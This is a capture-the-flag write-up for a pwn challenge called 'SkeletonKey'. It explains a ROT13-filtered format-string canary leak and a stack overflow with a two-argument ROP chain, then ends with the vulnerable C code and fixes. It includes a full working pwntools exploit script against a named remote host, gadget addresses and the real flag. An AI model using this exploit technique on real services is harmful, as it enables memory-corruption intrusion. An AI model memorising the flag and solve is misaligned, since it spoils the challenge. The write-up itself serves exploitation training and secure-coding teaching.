# SkeletonKey

**Author:** John_x9  
**Difficulty:** Insane  
**Connect:** `nc 167.86.100.57:9008`

End of the line: Skeleton Coast vault. Phase A is a filtered radio (ROT13 format string). Phase B is a short PIN blob with a canary. You must restore the stamp and dial **two** exact codes: `skeleton(0x1337, &g_key)`. One wrong arg prints a convincing reject flag. This is RotWind + CanaryPost + dual-arg ROP in one service.

---

## Blind solve path

### 1. Connect

```bash
nc 167.86.100.57 9008
```

```text
SkeletonKey
UA:
```

After the first input:

```text
PIN blob:
```

Two phases. No function addresses printed. Surviving may print `lock`.

### 2. Phase A: filtered + ROT13 format string

| You send | What you learn |
|----------|----------------|
| `AAAA` | Reply looks ROT13'd (`NNNN`). Same privacy trick as RotWind. |
| literal `%p` | Often becomes `%c` after ROT13. Not a pointer dump. |
| ROT13 preimage of `%p` (send `%c`) | You get a pointer. Format string runs **after** transform. |
| text containing `flag`, `nust`, or literal `%n` | `filtered` and exit. |

Important: the **filter runs on your raw input before ROT13**.

- Literal `%n` is blocked.
- Sending `%a` is allowed; after ROT13 it becomes `%n` (write primitive exists; not required for the intended solve).

### 3. Leak the canary

Find a stack slot that looks like a canary (`...00`, changes per connection). On this build, the format you want **after** ROT13 is `%17$p`.

```python
import codecs
# Client encodes; server ROT13 restores "%17$p"
codecs.encode('%17$p', 'rot_13')
```

```python
from pwn import *
import codecs
io = remote('167.86.100.57', 9008)
io.recvuntil(b'UA:')
io.sendline(codecs.encode('%17$p', 'rot_13').encode())
print(io.recvuntil(b'PIN blob:'))
```

Expect a `0x...00` value before `PIN blob:`.

### 4. Phase B: short overflow + canary

At `PIN blob:`:

1. ~96 bytes of junk without a valid canary → death (no clean `lock`).
2. Restore the canary at the right offset → control RIP.

Buffer is short (`pin[24]`). Read size is larger (~96). Enough for canary + a **compact** ROP, not a huge novel.

### 5. Fake flag

Wrong RIP or wrong args:

```text
skeleton rejects
nustCTF{4lm0st_but_4rgs_wr0ng_br0}
```

Trap. Intended call:

```text
skeleton(0x1337, &g_key)
```

Both must match.

### 6. Addresses: honest note

No PIE. Phase A can leak canaries (and sometimes code pointers). But `skeleton`, `g_key`, and gadgets are not labeled. Ask organizers for the matching binary, or use this build:

| Piece | Address | Meaning |
|-------|---------|---------|
| `ret` | `0x40101a` | Alignment helper |
| `pop rdi; ret` | `0x401820` | Load argument 1 |
| `pop rsi; ret` | `0x401822` | Load argument 2 |
| `g_key` | `0x404098` | Address of the key blob |
| `skeleton` | `0x4015ff` | Vault checker |

Blind dual-arg ROP without those values is impractical. The remote-only parts you **must** do on the wire are the ROT13/filter dance and the canary leak.

### 7. Working remote script

```python
#!/usr/bin/env python3
from pwn import *
import codecs
import re

HOST = '167.86.100.57'
PORT = 9008

POP_RDI  = 0x401820
POP_RSI  = 0x401822
RET      = 0x40101a
G_KEY    = 0x404098
SKELETON = 0x4015ff

context.log_level = 'error'

def enc(s):
    return codecs.encode(s, 'rot_13').encode()

io = remote(HOST, PORT)

io.recvuntil(b'UA:')
io.sendline(enc('%17$p'))
buf = io.recvuntil(b'PIN blob:')
canary = int(re.findall(rb'0x([0-9a-fA-F]+)', buf)[-1], 16)
assert canary & 0xff == 0

payload  = b'C' * 24
payload += p64(canary)
payload += p64(0)
payload += p64(RET)
payload += p64(POP_RDI) + p64(0x1337)
payload += p64(POP_RSI) + p64(G_KEY)
payload += p64(SKELETON)

io.send(payload)
print(io.recvall(timeout=2).decode(errors='ignore'))
```

Same script: [`solves/08-skeleton-solve.py`](solves/08-skeleton-solve.py).

### 8. Common mistakes

1. Submitting the reject honeypot.
2. Forgetting ROT13 on the leak payload.
3. Leaking then overflowing without restoring the canary.
4. Calling the vault path with only one correct argument.

---

## Real flag

```text
nustCTF{sk3l3t0n_r0t_c4n4ry_r0p}
```

---

## After the event: vulnerable code and how to fix

Vulnerable pattern (illustrative):

```c
int blocked(const char *s){
  if(strstr(s, "%n") || /* ... */) return 1;
  if(strstr(s, "nust") || strstr(s, "flag")) return 1;
  return 0;
}

void phase_scan(void){
  char buf[80];
  /* ... */
  if(blocked(buf)){ puts("filtered"); exit(0); }
  rot13(buf);
  printf(buf);   /* format string AFTER filter + ROT13 */
}

void phase_short(void){
  char pin[24];
  puts("PIN blob:");
  read(0, pin, 96);   /* overflow with canary still leakable from phase_scan */
}
```

Filter checks the preimage, then ROT13 can produce `%n` / `%p` / etc. Phase 2 overflows a short buffer. Together: canary leak + ROP into `skeleton(0x1337, &g_key)`.

**Secure coding fixes:**

1. `printf("%s", buf)` after any transform. Filter + ROT13 is not a substitute for safe printing.
2. If you filter format tokens, filter the **post-transform** string, or ban `%` entirely for user input.
3. Bound `phase_short`: `read(0, pin, sizeof pin)`.
4. Do not implement vault checks as easy ROP targets with magic constants in registers; use authenticated APIs and keep secrets out of attacker-controlled call chains.
5. Avoid shipping `gadget_farm` helpers in release builds.
